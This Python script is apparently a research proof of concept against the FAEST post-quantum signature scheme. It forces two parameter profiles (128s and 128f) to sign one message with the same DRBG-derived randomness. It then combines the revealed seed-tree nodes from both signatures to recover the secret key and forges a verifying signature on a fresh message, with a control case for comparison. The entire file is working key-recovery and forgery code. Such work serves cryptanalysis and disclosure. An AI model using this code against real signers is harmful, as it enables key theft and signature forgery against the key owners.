#!/usr/bin/env python3
"""Recover a FAEST key from s/f signatures that reuse signing randomness.

This is an out-of-model composition witness: the same key is deliberately used
with two parameter profiles on one message.  The retained attack resets the
submitted KAT DRBG to the same state before each profile's ordinary randomized
signing call, so both calls receive the same nonzero rho.  The default pair is
FAEST-128s/128f.
"""

import ctypes
import hashlib
import json
import sys
from pathlib import Path

try:
    from Crypto.Cipher import AES
except ImportError:
    print("SKIP: PyCryptodome is required for the public AES tree expansion")
    raise SystemExit(77)


ROOT = Path(__file__).resolve().parents[1]
PARAMETERS = json.loads((ROOT / "FAEST/internal-parameters.json").read_text())["parameter_sets"]
PARAMETERS = {row["parameter"]: row for row in PARAMETERS}


def shake(lam, data, length):
    h = hashlib.shake_128() if lam == 128 else hashlib.shake_256()
    h.update(data)
    return h.digest(length)


def prg(key, iv, tweak, length):
    value = bytearray(iv)
    value[12:16] = ((int.from_bytes(value[12:16], "little") + tweak) % 2**32).to_bytes(4, "little")
    low = int.from_bytes(value[:4], "little")
    aes = AES.new(bytes(key), AES.MODE_ECB)
    output = b""
    counter = 0
    while len(output) < length:
        block = bytearray(value)
        block[:4] = ((low + counter) % 2**32).to_bytes(4, "little")
        output += aes.encrypt(bytes(block))
        counter += 1
    return output[:length]


class Params:
    def __init__(self, name):
        row = PARAMETERS[name]
        self.name = name
        self.lam = row["lambda_bits"]
        self.lb = self.lam // 8
        self.tau = row["tau"]
        self.tau1 = row["tau1"]
        self.k = row["k"]
        self.L = row["L"]
        self.topen = row["Topen"]
        self.ell = row["witness_bits"]
        self.nlc = row["leaf_commitment_lambda_blocks"]
        self.nmult = row["and_gates"]
        self.d0 = row["d0"]
        self.sig = row["sig_bytes"]
        self.pk = row["pk_bytes"]
        self.sk = row["sk_bytes"]
        self.em = "em" in name
        self.ellhat = self.ell + 10 * self.d0

    def ni(self, i):
        return 2 ** (self.k if i < self.tau1 else self.k - 1)

    def pos(self, i, j):
        split = 2 ** (self.k - 1)
        if j < split:
            return self.L - 1 + self.tau * j + i
        return self.L - 1 + self.tau * split + self.tau1 * (j % split) + i

    def off_c(self, i):
        return (i - 1) * self.ell // 8

    def off_d(self):
        return (self.tau - 1) * self.ell // 8 + 10 * ((self.nmult + 7) // 8) + 4 * self.lb

    def off_decom(self):
        return self.tau * self.ell // 8 + 10 * ((self.nmult + 7) // 8) + 10 * self.lb

    def off_chall3(self):
        return self.sig - 4 - 16 - self.lb

    def off_ivpre(self):
        return self.sig - 4 - 16

    def deltas(self, challenge):
        bits = int.from_bytes(challenge, "little")
        output = []
        offset = 0
        for i in range(self.tau):
            width = self.k if i < self.tau1 else self.k - 1
            output.append((bits >> offset) & ((1 << width) - 1))
            offset += width
        return output


def revealed_nodes(p, signature):
    deltas = p.deltas(signature[p.off_chall3():p.off_chall3() + p.lb])
    state = bytearray(2 * p.L - 1)
    hidden = [p.pos(i, deltas[i]) for i in range(p.tau)]
    for node in hidden:
        state[node] = 1
    encoded = signature[p.off_decom() + p.nlc * p.lb * p.tau:]
    encoded = encoded[:p.topen * p.lb]
    known = {}
    pointer = 0
    for i in range(p.L - 2, -1, -1):
        state[i] = state[2 * i + 1] | state[2 * i + 2]
        if state[2 * i + 1] ^ state[2 * i + 2]:
            node = 2 * i + 1 + state[2 * i + 1]
            known[node] = encoded[pointer * p.lb:(pointer + 1) * p.lb]
            pointer += 1
    assert all(value == 0 for value in encoded[pointer * p.lb:])
    return known, hidden, deltas


def expand(known, iv, lam, limit):
    import heapq
    queue = list(known)
    heapq.heapify(queue)
    seen = set(queue)
    while queue:
        node = heapq.heappop(queue)
        if node >= limit:
            continue
        children = prg(known[node], iv, node, 2 * (lam // 8))
        for child, seed in ((2 * node + 1, children[:lam // 8]),
                            (2 * node + 2, children[lam // 8:])):
            known.setdefault(child, seed)
            if child not in seen:
                seen.add(child)
                heapq.heappush(queue, child)
    return known


def seed_rng(lib, label):
    raw = hashlib.shake_256(label).digest(48)
    seed = (ctypes.c_uint8 * 48).from_buffer_copy(raw)
    assert lib.nist_sig_seed(seed) == 0


def preview_rho(lib, label, length):
    """Return the first DRBG output after a reset, without changing the attack run."""
    seed_rng(lib, label)
    rho = (ctypes.c_uint8 * length)()
    assert lib.randombytes(rho, length) == 0
    return bytes(rho)


def randomized_signature(p, lib, sk, message, seed_label):
    """Call the ordinary randomized signer after a controlled DRBG reset."""
    seed_rng(lib, seed_label)
    signature = ctypes.create_string_buffer(p.sig)
    length = ctypes.c_size_t(p.sig)
    sign = getattr(lib, f"{p.name}_sign")
    assert sign(sk, message, len(message), signature, ctypes.byref(length)) == 0
    assert length.value == p.sig
    return signature.raw


def recover_candidates(short, fast, short_signature, fast_signature, pk, message):
    """Recover candidate OWF keys using only the public key and two signatures."""
    ivpre_a = short_signature[short.off_ivpre():short.off_ivpre() + 16]
    ivpre_b = fast_signature[fast.off_ivpre():fast.off_ivpre() + 16]
    known, hidden, deltas = revealed_nodes(short, short_signature)
    helper, _, _ = revealed_nodes(fast, fast_signature)
    clash = [node for node in helper if node in known and helper[node] != known[node]]

    # Tree seeds from different roots cannot be combined.  Reject that control
    # before counting leaves: merely sharing a node number does not recover the
    # corresponding seed, which was the source of the old misleading 11/11 log.
    if ivpre_a != ivpre_b or clash:
        return set(), {
            "ivpre_equal": ivpre_a == ivpre_b,
            "clashes": len(clash),
            "hidden": 0,
            "hidden_total": len(hidden),
        }

    mu = shake(short.lam, pk.raw + message + b"\x08", 2 * short.lb)
    iv = shake(short.lam, ivpre_a + mu + b"\x04", 16)
    for node, seed in helper.items():
        known.setdefault(node, seed)
    expand(known, iv, short.lam, short.L - 1)

    candidates = set()
    for i in range(short.tau):
        if short.pos(i, deltas[i]) not in known:
            continue
        aggregate = bytearray((short.ellhat + 7) // 8)
        for j in range(short.ni(i)):
            seed = known[short.pos(i, j)]
            leaf_seed = seed if short.em else prg(
                seed, iv, i + short.L - 1, 4 * short.lb
            )[:short.lb]
            value = prg(leaf_seed, iv, i ^ 0x80000000, len(aggregate))
            for k, byte in enumerate(value):
                aggregate[k] ^= byte
        witness_mask = bytes(aggregate[:short.ell // 8])
        if i:
            correction = short_signature[
                short.off_c(i):short.off_c(i) + short.ell // 8
            ]
            witness_mask = bytes(x ^ y for x, y in zip(witness_mask, correction))
        delta = short_signature[short.off_d():short.off_d() + short.ell // 8]
        candidates.add(bytes(x ^ y for x, y in zip(
            delta[:short.lb], witness_mask[:short.lb]
        )))
    return candidates, {
        "ivpre_equal": True,
        "clashes": 0,
        "hidden": sum(node in known for node in hidden),
        "hidden_total": len(hidden),
    }


def forge_with_candidates(p, lib, pk, candidates):
    """Select a recovered key publicly and forge without consulting the true sk."""
    accepted = []
    fresh = b"fresh message never signed by the key owner"
    public_input_bytes = p.lb if p.em else 16
    forge_rho = hashlib.shake_256(b"FAEST-1 forgery rho").digest(p.lb)
    for candidate in sorted(candidates):
        replacement = ctypes.create_string_buffer(
            pk.raw[:public_input_bytes] + candidate, p.sk
        )
        signature = ctypes.create_string_buffer(p.sig)
        length = ctypes.c_size_t(p.sig)
        sign = getattr(lib, f"{p.name}_sign_with_randomness")
        rc = sign(
            replacement, fresh, len(fresh), forge_rho, len(forge_rho),
            signature, ctypes.byref(length),
        )
        if rc != 0:
            continue
        verify = getattr(lib, f"{p.name}_verify")
        if verify(pk, fresh, len(fresh), signature, length) == 0:
            accepted.append(candidate)
    return accepted


def main():
    short_name = sys.argv[1] if len(sys.argv) > 1 else "faest_128s"
    fast_name = sys.argv[2] if len(sys.argv) > 2 else "faest_128f"
    short, fast = Params(short_name), Params(fast_name)
    if not (short.lam == fast.lam and short.em == fast.em and short.pk == fast.pk and short.sk == fast.sk):
        raise SystemExit("parameter profiles must share lambda, primitive, and key formats")
    libs = {
        short.name: ctypes.CDLL(str(ROOT / "FAEST/lib" / f"{short.name}.so")),
        fast.name: ctypes.CDLL(str(ROOT / "FAEST/lib" / f"{fast.name}.so")),
    }
    keygen = getattr(libs[short.name], f"{short.name}_keygen")
    pk = ctypes.create_string_buffer(short.pk)
    sk = ctypes.create_string_buffer(short.sk)
    assert keygen(pk, sk) == 0
    message = b"same message under short and fast profiles"

    repeated_seed = b"FAEST-1 repeated signing RNG state"
    short_rho = preview_rho(libs[short.name], repeated_seed, short.lb)
    fast_rho = preview_rho(libs[fast.name], repeated_seed, fast.lb)
    assert short_rho == fast_rho and any(short_rho)
    attack_a = randomized_signature(
        short, libs[short.name], sk, message, repeated_seed
    )
    attack_b = randomized_signature(
        fast, libs[fast.name], sk, message, repeated_seed
    )
    candidates, attack = recover_candidates(
        short, fast, attack_a, attack_b, pk, message
    )
    accepted = forge_with_candidates(short, libs[short.name], pk, candidates)

    control_a = randomized_signature(
        short, libs[short.name], sk, message, b"FAEST-1 control short RNG state"
    )
    control_b = randomized_signature(
        fast, libs[fast.name], sk, message, b"FAEST-1 control fast RNG state"
    )
    control_candidates, control = recover_candidates(
        short, fast, control_a, control_b, pk, message
    )
    control_accepted = forge_with_candidates(
        short, libs[short.name], pk, control_candidates
    )

    print(f"profiles: {short.name}, {fast.name}")
    print(f"repeated rho is nonzero: {any(short_rho)}")
    print(
        "repeated-rho case: "
        f"iv_pre equal={attack['ivpre_equal']}; shared-node clashes={attack['clashes']}; "
        f"compatible hidden leaves={attack['hidden']}/{attack['hidden_total']}; "
        f"candidates={len(candidates)}; publicly validated keys={len(accepted)}"
    )
    print(
        "different-rho control: "
        f"iv_pre equal={control['ivpre_equal']}; shared-node clashes={control['clashes']}; "
        f"compatible hidden leaves={control['hidden']}/{control['hidden_total']}; "
        f"candidates={len(control_candidates)}; publicly validated keys={len(control_accepted)}"
    )
    print(f"fresh-message forgery with recovered key verifies: {len(accepted) == 1}")
    attack_ok = (
        attack["ivpre_equal"] and attack["clashes"] == 0
        and attack["hidden"] == attack["hidden_total"]
        and len(accepted) == 1
    )
    control_ok = (
        not control["ivpre_equal"] and not control_candidates
        and not control_accepted and control["hidden"] == 0
    )
    return 0 if attack_ok and control_ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
